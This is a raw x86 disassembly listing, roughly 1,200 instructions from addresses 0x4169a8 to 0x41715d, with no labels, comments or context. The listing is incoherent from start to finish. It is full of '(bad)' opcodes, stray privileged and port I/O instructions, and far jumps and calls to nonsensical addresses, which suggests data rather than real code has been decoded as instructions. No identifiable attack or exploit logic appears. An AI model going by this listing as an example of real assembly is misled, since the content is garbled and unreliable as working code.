  4169a8:	sar    BYTE PTR ds:0xc85271dc,0xc6
  4169af:	sti    
  4169b0:	push   ss
  4169b1:	and    ch,ch
  4169b3:	push   ds
  4169b4:	and    dh,bh
  4169b6:	repz adc al,0x2a
  4169b9:	push   edi
  4169ba:	jge    0x4169e4
  4169bc:	and    DWORD PTR [esi],ebx
  4169be:	add    eax,0x7562053
  4169c3:	xor    eax,DWORD PTR [ebx+edi*8-0x55144062]
  4169ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169cb:	xchg   ecx,eax
  4169cc:	lahf   
  4169cd:	adc    eax,0xe21546b2
  4169d2:	pop    ebx
  4169d3:	fiadd  DWORD PTR [esi*8-0x3b41cf8a]
  4169da:	ins    DWORD PTR es:[edi],dx
  4169db:	mov    edi,0xd7bb9b42
  4169e0:	dec    ecx
  4169e1:	mov    dl,0x3a
  4169e3:	shr    BYTE PTR [edi+0x71],0x1
  4169e7:	(bad)  
  4169e8:	cmp    ebx,DWORD PTR [ecx+0x74167b5e]
  4169ee:	call   0x3f179a4d
  4169f3:	rcl    BYTE PTR [ecx+0x73],0x3e
  4169f7:	daa    
  4169f8:	icebp  
  4169f9:	jbe    0x416a45
  4169fb:	sahf   
  4169fc:	push   ebp
  4169fd:	pop    es
  4169fe:	das    
  4169ff:	lods   al,BYTE PTR ds:[esi]
  416a00:	jno    0x416a0c
  416a02:	imul   ebp,DWORD PTR [eax],0x2d
  416a05:	(bad)  
  416a06:	sar    BYTE PTR [edi+0x3524fa27],cl
  416a0c:	mov    ecx,DWORD PTR [esi-0x32]
  416a0f:	mov    cl,0xc9
  416a11:	push   edx
  416a12:	sbb    eax,0x4d986644
  416a17:	inc    ecx
  416a18:	jmp    0x6e70a373
  416a1d:	clc    
  416a1e:	in     eax,0x30
  416a20:	mov    dl,0x78
  416a22:	xchg   esp,eax
  416a23:	pop    esi
  416a24:	or     al,bl
  416a26:	mov    cl,0x98
  416a28:	jae    0x4169d7
  416a2a:	call   0x12f3503d
  416a2f:	push   edx
  416a30:	sbb    al,0x4f
  416a32:	dec    ebp
  416a33:	nop
  416a34:	aaa    
  416a35:	push   ss
  416a36:	and    eax,edx
  416a38:	xchg   ebx,eax
  416a39:	push   esi
  416a3b:	repnz xor esi,ebx
  416a3e:	xor    cl,BYTE PTR [eax-0x7]
  416a41:	sub    esp,ebx
  416a43:	fcomp  DWORD PTR [ecx+eax*8]
  416a46:	sub    ah,BYTE PTR [ecx-0x1e71500e]
  416a4c:	jne    0x416aa7
  416a4e:	mov    ebp,0x477e5a39
  416a53:	mov    ds:0xd713e8b,al
  416a58:	push   ax
  416a5a:	int3   
  416a5b:	inc    ebp
  416a5c:	mov    al,ds:0xd90df687
  416a61:	jge    0x416a1b
  416a63:	pop    ds
  416a64:	cld    
  416a65:	push   ebx
  416a66:	xchg   cl,dh
  416a68:	(bad)  
  416a6a:	jnp    0x416a78
  416a6c:	ss into 
  416a6e:	push   ebp
  416a6f:	test   al,0x6e
  416a71:	jl     0x416a8c
  416a73:	lahf   
  416a74:	mov    WORD PTR [eax+eax*2-0x4c51c3a5],?
  416a7b:	test   al,0x23
  416a7d:	jno    0x416ab5
  416a7f:	imul   edi,DWORD PTR [eax+0x44],0xffffffe4
  416a83:	imul   ebx,DWORD PTR [esp+ebx*8],0x1fdadff9
  416a8a:	pop    ebx
  416a8b:	enter  0x4296,0xe1
  416a8f:	cmp    eax,0x4fa05a68
  416a94:	jnp    0x416ae5
  416a96:	adc    bl,BYTE PTR [ecx]
  416a98:	jmp    0x68eee1d1
  416a9d:	cdq    
  416a9e:	ins    DWORD PTR es:[edi],dx
  416a9f:	or     eax,0x3a2323b3
  416aa4:	fcmovb st,st(0)
  416aa6:	and    ah,ch
  416aa8:	les    ecx,FWORD PTR [esi-0x55]
  416aab:	sar    bh,0x56
  416aae:	and    ecx,DWORD PTR [edx-0x5e]
  416ab1:	int3   
  416ab2:	push   0xcc5cf3b6
  416ab7:	sbb    DWORD PTR [ebx-0x3e],eax
  416aba:	xchg   esi,eax
  416abb:	adc    DWORD PTR [edx-0x5f9e0713],ebp
  416ac1:	rcr    bh,0xe
  416ac4:	jo     0x416a50
  416ac6:	nop
  416ac7:	mov    ecx,0x3bed9314
  416acc:	mov    dl,0x6
  416ace:	lods   al,BYTE PTR ds:[esi]
  416acf:	xor    bl,bl
  416ad1:	mov    dh,0xfb
  416ad3:	inc    ebx
  416ad4:	mov    dl,0x48
  416ad6:	mov    eax,0xda3471f3
  416adb:	(bad)  
  416adc:	pop    esi
  416add:	rcl    DWORD PTR [edx+0x56],0xb3
  416ae1:	imul   ebx,DWORD PTR [esi+ebx*4-0x51],0x3f
  416ae6:	fcomp  DWORD PTR [eax+0x449dc189]
  416aec:	sub    DWORD PTR [eax],ebp
  416aee:	mov    al,0x2d
  416af0:	dec    edi
  416af1:	mov    edi,0xa9e635e1
  416af6:	mov    DWORD PTR [ebx+0x18b6c99f],ebx
  416afc:	mov    fs,ebp
  416afe:	mov    dl,BYTE PTR [ebx+0x55]
  416b01:	mov    cl,0x79
  416b03:	mov    ch,0x4a
  416b05:	pop    ebp
  416b06:	(bad)  
  416b07:	adc    al,0x35
  416b09:	or     BYTE PTR [ecx+eax*1],cl
  416b0c:	cmp    dl,BYTE PTR [edi+0x41a2a06]
  416b12:	sbb    BYTE PTR [ebx+0x0],ah
  416b15:	ds xchg ecx,eax
  416b17:	ret    0x1105
  416b1a:	shr    BYTE PTR [ebx],0xf3
  416b1d:	sahf   
  416b1e:	add    al,0x20
  416b20:	jge    0x416b03
  416b22:	popa   
  416b23:	mov    ds:0xfd1405b4,eax
  416b28:	lahf   
  416b29:	inc    esp
  416b2a:	add    BYTE PTR [ebx],dh
  416b2c:	mov    dh,0x15
  416b2e:	xor    esp,DWORD PTR ds:0x4de41ea
  416b34:	call   0xe059:0xe49125fa
  416b3b:	cli    
  416b3c:	pop    ebp
  416b3d:	xchg   al,dh
  416b3f:	and    al,0x55
  416b41:	mov    ss,WORD PTR [edi+edi*2+0x2b]
  416b45:	fucom  st(4)
  416b47:	call   0x32e0797f
  416b4c:	pop    es
  416b4d:	mov    dh,0x81
  416b4f:	mov    bh,0xdc
  416b51:	call   0x4bd:0xdb14947d
  416b58:	sbb    eax,DWORD PTR [ecx-0x49]
  416b5b:	in     al,dx
  416b5c:	inc    eax
  416b5d:	sbb    BYTE PTR [esi+0x4e],ah
  416b60:	jbe    0x416bab
  416b62:	fcomp  st(6)
  416b64:	(bad)  
  416b65:	push   esi
  416b66:	or     dh,BYTE PTR [esi]
  416b68:	aad    0x4e
  416b6a:	pop    edx
  416b6b:	int    0x2f
  416b6d:	add    ebx,edi
  416b6f:	daa    
  416b70:	ret    
  416b71:	push   ds
  416b72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b73:	inc    esp
  416b74:	mov    ah,ah
  416b76:	jnp    0x416b12
  416b78:	xchg   esp,eax
  416b79:	(bad)  
  416b7a:	ja     0x416b6a
  416b7c:	ins    DWORD PTR es:[edi],dx
  416b7d:	dec    ecx
  416b7e:	stos   DWORD PTR es:[edi],eax
  416b7f:	addr16 sbb ch,0x9f
  416b83:	inc    eax
  416b84:	call   0xabf9b28b
  416b89:	stc    
  416b8a:	add    BYTE PTR [ebx+esi*8-0x76],al
  416b8e:	pop    es
  416b8f:	or     DWORD PTR ds:[esi],edx
  416b92:	push   ebp
  416b93:	hlt    
  416b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b95:	sub    dl,BYTE PTR ss:[ebp+0x566e33dd]
  416b9c:	lods   al,BYTE PTR ds:[esi]
  416b9d:	out    0x81,al
  416b9f:	mov    ecx,0x83da5097
  416ba4:	es call 0x25eb:0xa6764938
  416bac:	ins    BYTE PTR es:[edi],dx
  416bad:	push   cs
  416bae:	sbb    DWORD PTR [edi],esi
  416bb0:	jne    0x416c16
  416bb2:	mov    ds:0xc40f10ad,al
  416bb7:	fcmovnbe st,st(0)
  416bb9:	sbb    BYTE PTR [ecx+0x32],bh
  416bbc:	inc    eax
  416bbd:	loopne 0x416b46
  416bbf:	popfw  
  416bc1:	aaa    
  416bc2:	cmp    al,0xdc
  416bc4:	jmp    0xe3e6:0xdb3cca0e
  416bcb:	xchg   DWORD PTR [edx-0x11],esp
  416bce:	xor    al,0x6f
  416bd0:	pop    esp
  416bd1:	addr16 cmp ah,bh
  416bd4:	scas   eax,DWORD PTR es:[edi]
  416bd5:	aad    0xcd
  416bd7:	ins    DWORD PTR es:[edi],dx
  416bd8:	loop   0x416c41
  416bda:	pusha  
  416bdb:	sbb    eax,0xbed63281
  416be0:	setge  BYTE PTR [ecx+0x2474860a]
  416be7:	sub    ah,BYTE PTR [ebx+0x4f]
  416bea:	xchg   edx,eax
  416beb:	stc    
  416bec:	(bad)  
  416bed:	iret   
  416bee:	fldcw  WORD PTR [ebx]
  416bf0:	into   
  416bf1:	shl    DWORD PTR [ebx-0x1a],0x74
  416bf5:	dec    ecx
  416bf6:	test   eax,0x87dcb4b5
  416bfb:	(bad)  [ebx+0x41]
  416bfe:	ret    0x47e0
  416c01:	(bad)  
  416c02:	and    al,0x63
  416c04:	mul    BYTE PTR [eax]
  416c06:	add    DWORD PTR [esi],edx
  416c08:	push   ecx
  416c09:	xor    al,0x99
  416c0b:	jnp    0x416bd5
  416c0d:	jecxz  0x416c75
  416c0f:	sbb    esp,DWORD PTR [ebx+0x3508a0cd]
  416c15:	and    BYTE PTR [edx],0xbf
  416c18:	out    dx,al
  416c19:	push   ds
  416c1a:	int    0x91
  416c1c:	push   ss
  416c1d:	test   DWORD PTR [ebx-0x37],esi
  416c20:	jmp    0xec57:0xb2e46ac
  416c27:	add    ecx,DWORD PTR [eax]
  416c29:	mov    al,ds:0x22b1b8c0
  416c2e:	into   
  416c2f:	jp     0x416c69
  416c31:	arpl   sp,sp
  416c33:	sbb    BYTE PTR [ecx-0xb8bd868],ah
  416c39:	(bad)  
  416c3a:	cmp    dh,BYTE PTR ds:0x3684dbc0
  416c40:	push   esp
  416c41:	cmp    eax,0xc2f5fd66
  416c46:	fstp   QWORD PTR [esp+ebx*2+0x6b]
  416c4a:	pop    edx
  416c4b:	push   ds
  416c4c:	cmc    
  416c4d:	test   eax,0x5d8b8c83
  416c52:	in     eax,dx
  416c53:	into   
  416c54:	(bad)  
  416c55:	sub    eax,0x399bc92f
  416c5a:	or     al,0x34
  416c5c:	in     al,dx
  416c5d:	add    al,0xaf
  416c5f:	outs   dx,BYTE PTR ds:[esi]
  416c60:	sbb    al,bh
  416c62:	bound  esi,QWORD PTR [ecx+0x42968272]
  416c68:	mov    ebp,0x6e3878e2
  416c6d:	push   0xffffffac
  416c6f:	sub    ch,BYTE PTR [edi+0x7c226669]
  416c75:	hlt    
  416c76:	call   0xf325d5fd
  416c7b:	sbb    DWORD PTR [ecx+0x11],edx
  416c7e:	jno    0x416c04
  416c80:	test   al,0x93
  416c82:	shl    BYTE PTR [esi],cl
  416c84:	repnz or DWORD PTR [ecx-0x135180a3],eax
  416c8b:	cmp    edi,ecx
  416c8d:	call   0x468dcee5
  416c92:	xchg   edi,eax
  416c93:	imul   ecx,DWORD PTR [edi+0x22],0xf6e43672
  416c9a:	xor    eax,0xf50aa509
  416c9f:	int    0x7d
  416ca1:	in     eax,0xfb
  416ca3:	rcl    BYTE PTR [bx+0x6696],cl
  416ca8:	adc    edx,ebp
  416caa:	xchg   ecx,eax
  416cab:	jge    0x416cac
  416cad:	dec    ebx
  416cae:	lea    ebx,[ecx+edi*8-0x60]
  416cb2:	imul   BYTE PTR [ecx-0x400885ff]
  416cb8:	ins    BYTE PTR es:[edi],dx
  416cb9:	scas   al,BYTE PTR es:[edi]
  416cba:	(bad)  
  416cbb:	daa    
  416cbc:	cmp    edx,DWORD PTR [edx]
  416cbe:	inc    esp
  416cbf:	inc    BYTE PTR [edx]
  416cc1:	stc    
  416cc2:	or     al,0x71
  416cc4:	dec    ebp
  416cc5:	adc    eax,0xfed79b11
  416cca:	mov    bh,0x9f
  416ccc:	mov    al,0xec
  416cce:	mov    edi,0xaec9d40c
  416cd3:	gs cmp eax,0x1170c766
  416cd9:	mov    eax,ds:0x5e90f250
  416cde:	push   0x61
  416ce0:	jmp    0x416d34
  416ce2:	mov    dh,bl
  416ce4:	inc    edx
  416ce5:	pop    ds
  416ce6:	dec    edx
  416ce7:	jbe    0x416c9d
  416ce9:	sub    bh,BYTE PTR [ecx]
  416ceb:	fs scas al,BYTE PTR es:[edi]
  416ced:	add    eax,0xc627656f
  416cf2:	stos   BYTE PTR es:[edi],al
  416cf3:	repz test BYTE PTR [edx+0x71b47c7d],bl
  416cfa:	xchg   edi,eax
  416cfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cfc:	les    edi,FWORD PTR [edx+0x7c95bb96]
  416d02:	push   edi
  416d03:	(bad)  
  416d04:	retf   0xab4c
  416d07:	pop    ebx
  416d08:	cdq    
  416d09:	jge    0x416d29
  416d0b:	aas    
  416d0c:	das    
  416d0d:	out    0xc1,eax
  416d0f:	sub    dh,BYTE PTR [esi-0x7c3317d9]
  416d15:	(bad)  
  416d17:	mov    ch,0x83
  416d19:	pop    ebp
  416d1a:	jge    0x416cd7
  416d1c:	pop    es
  416d1d:	mov    bh,0x94
  416d1f:	div    edi
  416d21:	mov    eax,0x815aae78
  416d26:	into   
  416d27:	fidiv  WORD PTR [ecx+ebp*2-0x5a]
  416d2b:	mov    WORD PTR [edx],ds
  416d2d:	mov    edx,0x9f95a69
  416d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d33:	sbb    DWORD PTR [eax-0x14050412],0xc92f5df2
  416d3d:	daa    
  416d3e:	and    eax,0xaa5a3b99
  416d43:	dec    edx
  416d44:	in     al,dx
  416d45:	cmc    
  416d46:	pop    ds
  416d47:	push   ecx
  416d48:	mov    BYTE PTR [ebx+ebx*2+0x68],ch
  416d4c:	and    DWORD PTR [edx-0x3e],ebx
  416d4f:	dec    ebx
  416d50:	repz clc 
  416d52:	idiv   DWORD PTR [ebp-0x22e4906e]
  416d58:	jp     0x416dd6
  416d5a:	adc    edi,DWORD PTR [ebx-0x2ecac94]
  416d60:	and    DWORD PTR [ebp-0x27698538],eax
  416d66:	cli    
  416d67:	popa   
  416d68:	imul   ax,WORD PTR [ecx],0xfff4
  416d6c:	jb     0x416cfa
  416d6e:	mov    esi,0xe30b64a7
  416d73:	cmp    DWORD PTR [ebx+0x601cadbd],eax
  416d79:	mov    bl,0xbf
  416d7b:	add    eax,0xa6f9a42f
  416d80:	sub    bl,BYTE PTR [eax+0x5506f63c]
  416d86:	push   0x53efc7da
  416d8b:	bound  esi,QWORD PTR [ebp+0x68947887]
  416d91:	xchg   edi,eax
  416d92:	xlat   BYTE PTR ds:[ebx]
  416d93:	(bad)  ds:0x384b93f3
  416d99:	(bad)  
  416d9a:	mov    ah,0x8b
  416d9c:	shl    DWORD PTR [edi-0x47174d9c],1
  416da2:	and    BYTE PTR [esi-0x61],0x17
  416da6:	iret   
  416da7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416da8:	sub    DWORD PTR [ebx],edx
  416daa:	add    al,0xd9
  416dac:	scas   eax,DWORD PTR es:[edi]
  416dad:	sub    edi,ebx
  416daf:	adc    BYTE PTR [edi],bh
  416db1:	arpl   WORD PTR [esi],si
  416db3:	or     eax,0x46e5984f
  416db8:	xor    al,BYTE PTR [esi-0x60]
  416dbb:	xchg   BYTE PTR [edi-0x6ea962f3],cl
  416dc1:	std    
  416dc2:	jb     0x416d74
  416dc4:	test   DWORD PTR ds:0xd350121,esp
  416dca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dcb:	scas   al,BYTE PTR es:[edi]
  416dcc:	jp     0x416d50
  416dce:	add    ch,BYTE PTR [ebx+0x7bb64a7d]
  416dd4:	sub    al,0x4
  416dd6:	jns    0x416e19
  416dd8:	pop    ss
  416dd9:	jecxz  0x416e07
  416ddb:	and    cl,BYTE PTR [ecx+ecx*2-0x39950e61]
  416de2:	mov    dh,0xb4
  416de4:	shl    BYTE PTR [edx],0xba
  416de7:	rcr    BYTE PTR [eax],0x7d
  416dea:	mul    BYTE PTR [ecx+0x71]
  416ded:	pop    ds
  416dee:	mov    al,ds:0x673766fa
  416df3:	gs sbb cl,bh
  416df6:	aas    
  416df7:	das    
  416df8:	fwait
  416df9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dfa:	mov    ah,0xa5
  416dfc:	out    0xf8,eax
  416dfe:	(bad)  
  416dff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e00:	shr    DWORD PTR [eax+0x157e1dce],cl
  416e06:	(bad)  
  416e07:	clc    
  416e08:	mov    al,ds:0x5fbc2508
  416e0d:	mov    ah,0xa
  416e0f:	scas   al,BYTE PTR es:[edi]
  416e10:	xchg   esi,eax
  416e11:	cs jmp 0xf2bb:0x5c9f2b6b
  416e19:	rcr    al,cl
  416e1b:	dec    eax
  416e1c:	inc    eax
  416e1d:	call   0x86be6f52
  416e22:	pushw  0x55
  416e25:	or     ah,BYTE PTR [eax+edx*8]
  416e28:	push   edi
  416e29:	lock leave 
  416e2b:	aad    0xc6
  416e2d:	dec    DWORD PTR cs:[esi-0x40]
  416e31:	enter  0x7413,0xf5
  416e35:	mov    bh,0xaf
  416e37:	jb     0x416e6a
  416e39:	mov    eax,0x19beff3
  416e3e:	ins    BYTE PTR es:[edi],dx
  416e3f:	call   0xa3d4b9f4
  416e44:	cmp    bh,BYTE PTR [edi]
  416e46:	xor    ebx,edi
  416e48:	popf   
  416e49:	mov    al,0x8d
  416e4b:	lds    eax,FWORD PTR [ebp+0x1dc8668c]
  416e51:	sub    eax,0x328094f8
  416e56:	ins    BYTE PTR es:[edi],dx
  416e57:	imul   esi
  416e59:	xor    BYTE PTR [ecx+0x6bbae870],0xe9
  416e60:	pop    ebx
  416e61:	sub    DWORD PTR [eax-0x7e3b425],edx
  416e67:	ja     0x416e5f
  416e69:	sar    DWORD PTR [bp+si+0x3c],1
  416e6d:	adc    bh,bl
  416e6f:	add    DWORD PTR [eax],0xffffffc3
  416e72:	push   DWORD PTR [esp+esi*8-0x622ef328]
  416e79:	(bad)  
  416e7a:	aam    0x40
  416e7c:	out    0xf,eax
  416e7e:	lea    ecx,[esi-0x763fafd]
  416e84:	int    0xb6
  416e86:	dec    esp
  416e87:	aaa    
  416e88:	ficomp DWORD PTR [esi-0xed835c2]
  416e8e:	mov    cl,0x61
  416e90:	cld    
  416e91:	shr    DWORD PTR [esi-0x31],cl
  416e94:	shr    DWORD PTR [ecx],1
  416e96:	jmp    0x416eac
  416e98:	mov    ebx,DWORD PTR ds:0xe6d7fc40
  416e9e:	or     DWORD PTR [eax-0x75019102],esi
  416ea4:	or     bl,cl
  416ea6:	xor    ch,BYTE PTR [ebx-0x46]
  416ea9:	xchg   ecx,eax
  416eaa:	fdivrp st(0),st
  416eac:	push   edi
  416ead:	inc    ebx
  416eae:	sbb    DWORD PTR [eax+0x77e9395c],0xa60a71c3
  416eb8:	fchs   
  416eba:	pop    ebx
  416ebb:	adc    DWORD PTR [eax-0x6c],0x7d
  416ebf:	jne    0x416ec1
  416ec1:	xchg   edi,eax
  416ec2:	xor    dh,bh
  416ec4:	xchg   ecx,eax
  416ec5:	inc    ebx
  416ec6:	dec    esi
  416ec7:	jmp    FWORD PTR [esp+ebx*1]
  416eca:	xor    bl,ch
  416ecc:	sahf   
  416ecd:	xchg   ecx,eax
  416ece:	add    BYTE PTR [esi],bh
  416ed0:	sub    eax,0x74976c19
  416ed5:	pop    ebx
  416ed6:	leave  
  416ed7:	cmp    ebp,DWORD PTR [ecx+0x2d]
  416eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416edb:	test   DWORD PTR [esi+eax*4+0x22162de],ebx
  416ee2:	out    dx,al
  416ee3:	je     0x416ef7
  416ee5:	sbb    al,0xe0
  416ee7:	pop    ebx
  416ee8:	je     0x416f63
  416eea:	div    BYTE PTR [eax]
  416eec:	test   al,0xf4
  416eee:	rcr    DWORD PTR [ebp-0x7c],cl
  416ef1:	push   esp
  416ef2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ef3:	inc    edx
  416ef4:	loopne 0x416f62
  416ef6:	and    esp,DWORD PTR [ebp+0x3a626530]
  416efc:	inc    eax
  416efd:	dec    ebx
  416efe:	(bad)  
  416eff:	out    0x1c,al
  416f01:	scas   al,BYTE PTR es:[edi]
  416f02:	shl    BYTE PTR [edx],1
  416f04:	mov    ch,0xe5
  416f06:	cli    
  416f07:	mov    bh,0x87
  416f09:	lahf   
  416f0a:	sbb    edi,DWORD PTR [ebp+0x77e81a38]
  416f10:	fwait
  416f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f12:	push   eax
  416f13:	xor    ebx,DWORD PTR [ecx]
  416f15:	in     eax,0xb2
  416f17:	or     al,0xf8
  416f19:	aad    0x89
  416f1b:	rol    DWORD PTR [ecx],cl
  416f1d:	sbb    eax,DWORD PTR [eiz*4-0x6dbf7c56]
  416f24:	adc    eax,0x6cfff346
  416f29:	adc    al,BYTE PTR ds:0x960061a
  416f2f:	cwde   
  416f30:	xchg   esp,eax
  416f31:	sub    DWORD PTR [ebp-0x25],esp
  416f34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f35:	test   esp,ebx
  416f37:	test   DWORD PTR [ecx-0x1017199e],0x1ba757a3
  416f41:	xchg   ebx,eax
  416f42:	addr16 enter 0xb9d6,0xb9
  416f47:	pop    eax
  416f48:	dec    ebp
  416f49:	fwait
  416f4a:	pop    ebp
  416f4b:	or     al,0x4b
  416f4d:	mov    dh,0xb7
  416f4f:	jge    0x416fd0
  416f51:	inc    ebp
  416f52:	sbb    DWORD PTR [ecx],edi
  416f54:	mov    edi,eax
  416f56:	in     eax,dx
  416f57:	popf   
  416f58:	add    DWORD PTR [esi],edx
  416f5a:	jecxz  0x416f34
  416f5c:	inc    ecx
  416f5d:	ret    
  416f5e:	sub    eax,0x6cb571ad
  416f63:	cmpps  xmm0,XMMWORD PTR [esi-0x2c],0x67
  416f68:	fisub  DWORD PTR [ebp-0x577d6f60]
  416f6e:	dec    edx
  416f6f:	mov    WORD PTR [edi+0xd7225d],ds
  416f75:	adc    eax,0x3c9aa5f9
  416f7a:	pop    es
  416f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f7c:	xchg   esp,eax
  416f7d:	lock sub BYTE PTR [esi+0x43329f91],ah
  416f84:	mov    al,ds:0x9c3c15f2
  416f89:	push   edx
  416f8a:	(bad)  
  416f8b:	ins    DWORD PTR es:[edi],dx
  416f8c:	mov    edx,0x18a7849e
  416f91:	sbb    ch,bl
  416f93:	nop
  416f94:	popa   
  416f95:	int3   
  416f96:	jp     0x417007
  416f98:	bound  esp,QWORD PTR [ecx-0x80]
  416f9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f9c:	dec    esp
  416f9d:	dec    esi
  416f9e:	jecxz  0x416faa
  416fa0:	loope  0x416f98
  416fa2:	ins    DWORD PTR es:[edi],dx
  416fa3:	repnz ins DWORD PTR es:[edi],dx
  416fa5:	push   ebx
  416fa6:	fs or  ebx,eax
  416fa9:	cmp    eax,DWORD PTR [edx]
  416fab:	iret   
  416fac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fad:	jne    0x416f7e
  416faf:	adc    DWORD PTR [ebp+0x60],ebx
  416fb2:	test   DWORD PTR [ecx+0x12],ecx
  416fb5:	shl    DWORD PTR [edi-0x53e70398],0xc6
  416fbc:	adc    DWORD PTR [ecx+ebp*2+0x20450b92],0x60
  416fc4:	push   edx
  416fc5:	call   0x9cd:0xdc122d6a
  416fcc:	enter  0xe0e8,0x2d
  416fd0:	hlt    
  416fd1:	stos   DWORD PTR es:[edi],eax
  416fd2:	sbb    al,0x3e
  416fd4:	out    0x81,al
  416fd6:	repnz test al,0xd5
  416fd9:	dec    esp
  416fda:	mov    ecx,0x334ecbe3
  416fdf:	dec    ebp
  416fe0:	xchg   ebx,eax
  416fe1:	in     eax,dx
  416fe2:	pop    ecx
  416fe3:	leave  
  416fe4:	push   esi
  416fe5:	int3   
  416fe6:	cli    
  416fe7:	sbb    eax,0xc0db56de
  416fec:	and    dl,BYTE PTR [esi+0x2e0a54b1]
  416ff2:	mov    ecx,0x661529f2
  416ff7:	cs mov edx,0x92290e09
  416ffd:	add    ah,BYTE PTR [esi+0x28]
  417000:	mov    al,BYTE PTR [ecx-0x61192b30]
  417006:	mov    ds:0xe784bbcb,al
  41700b:	push   cs
  41700c:	and    BYTE PTR [edi-0x5b],ah
  41700f:	mov    al,ds:0x986ef144
  417014:	jnp    0x416ff6
  417016:	imul   ebx,esp,0xc40fa531
  41701c:	or     al,0xe4
  41701e:	out    dx,eax
  41701f:	cmp    BYTE PTR [esi+0x3e],al
  417022:	test   eax,0x60b17d3a
  417027:	pushf  
  417028:	mov    ds:0x16634ea5,eax
  41702d:	mov    bl,0x94
  41702f:	xor    ebp,DWORD PTR [ebp+0x6e1d1f78]
  417035:	sbb    al,0x3f
  417037:	out    0xb6,al
  417039:	in     al,0x57
  41703b:	jbe    0x416fc4
  41703d:	push   ebx
  41703e:	cs add eax,0xe313a23f
  417044:	les    edx,FWORD PTR [edx+0xa]
  417047:	xchg   ebp,eax
  417048:	push   ebx
  417049:	cs mov esp,0x33c8f6fc
  417050:	mov    ch,0x11
  417052:	call   0x4ba6d30f
  417057:	sti    
  417058:	xlat   BYTE PTR ds:[ebx]
  417059:	bound  ecx,QWORD PTR [ebp-0x11]
  41705c:	pop    ebx
  41705d:	nop
  41705e:	inc    ebp
  41705f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417060:	jge    0x4170b8
  417062:	add    ebp,0x11
  417065:	inc    ebx
  417066:	leave  
  417067:	rcl    DWORD PTR es:[ebx],0x92
  41706b:	push   ecx
  41706c:	in     al,0x79
  41706e:	popf   
  41706f:	lahf   
  417070:	pop    edx
  417071:	adc    BYTE PTR [edi],0x69
  417074:	test   eax,0xeefa455d
  417079:	push   esi
  41707a:	fcomp  st(6)
  41707c:	sub    eax,0x327fcf0f
  417081:	dec    esi
  417082:	aad    0x6e
  417084:	ins    DWORD PTR es:[edi],dx
  417085:	push   es
  417086:	cmc    
  417087:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417088:	sub    DWORD PTR [ebx],ecx
  41708a:	jae    0x417040
  41708c:	add    DWORD PTR [esi],esi
  41708e:	sbb    BYTE PTR [edx-0x5adb5378],ah
  417094:	push   ebx
  417095:	sub    al,0xdb
  417097:	fistp  QWORD PTR [ebp-0x56]
  41709a:	dec    edx
  41709b:	in     eax,0x65
  41709d:	das    
  41709e:	jp     0x4170a0
  4170a0:	cmp    cl,BYTE PTR [ebx+0x16a88145]
  4170a6:	add    eax,0x6b0961d0
  4170ab:	xor    BYTE PTR [edx+0x9],0xab
  4170af:	outs   dx,BYTE PTR ds:[esi]
  4170b0:	cmc    
  4170b1:	push   edi
  4170b2:	mov    ebp,0x61bf1deb
  4170b7:	(bad)  
  4170b8:	mov    eax,DWORD PTR [edi-0x26674b1a]
  4170be:	and    edx,DWORD PTR [ecx+0x6c7d9210]
  4170c4:	lods   eax,DWORD PTR ds:[esi]
  4170c5:	xor    eax,0xb1a9f397
  4170ca:	dec    ecx
  4170cb:	(bad)  
  4170cc:	jle    0x4170b1
  4170ce:	int    0x32
  4170d0:	jne    0x4170c7
  4170d2:	and    DWORD PTR [edi+0x1a],esi
  4170d5:	cld    
  4170d6:	xchg   esp,eax
  4170d7:	inc    esi
  4170d8:	and    ch,ch
  4170da:	scas   al,BYTE PTR es:[edi]
  4170db:	bound  ecx,QWORD PTR [eax+eiz*4-0x63]
  4170df:	les    ecx,FWORD PTR [ecx+0x5a]
  4170e2:	mov    ds:0xa51ca8d6,eax
  4170e7:	pop    edi
  4170e8:	xchg   ebp,eax
  4170e9:	adc    ch,dl
  4170eb:	scas   al,BYTE PTR es:[edi]
  4170ec:	test   eax,0xa0fe4781
  4170f1:	sub    BYTE PTR [ebx-0x279c113b],bh
  4170f7:	mov    dl,0x5b
  4170f9:	pop    esp
  4170fa:	ss mov ch,0xeb
  4170fd:	and    DWORD PTR [ecx],0x3aa4839
  417103:	pop    ebx
  417104:	lds    esi,FWORD PTR [eax]
  417106:	dec    eax
  417107:	xor    BYTE PTR [esi-0x2],dh
  41710a:	and    bl,BYTE PTR [ebx-0x3be23538]
  417110:	push   ds
  417111:	xor    bh,cl
  417113:	mov    DWORD PTR [ecx-0x314d04d],edi
  417119:	cmp    DWORD PTR [ebx+0x2df21039],0x7359c639
  417123:	jae    0x417167
  417125:	div    BYTE PTR [esi]
  417127:	test   DWORD PTR [eax-0x75bfa992],esi
  41712d:	aad    0x37
  41712f:	pop    esi
  417130:	jecxz  0x41710e
  417132:	push   ss
  417133:	xor    edi,DWORD PTR [ecx+0x2842f161]
  417139:	jns    0x4170d2
  41713b:	pusha  
  41713c:	push   ebp
  41713d:	lahf   
  41713e:	dec    esi
  41713f:	push   esp
  417140:	scas   al,BYTE PTR es:[edi]
  417141:	cmp    dh,BYTE PTR [ebp+0x1e]
  417144:	mov    al,0x29
  417146:	sbb    bl,0x8d
  417149:	jae    0x417160
  41714b:	(bad)  
  41714c:	mov    eax,0x5e89047c
  417151:	cmp    DWORD PTR [edi],edx
  417153:	inc    edx
  417154:	mov    eax,ds:0xfbf67f81
  417159:	in     eax,0xd2
  41715b:	rcl    eax,cl
  41715d:	mov    ah,BYTE PTR [eax]
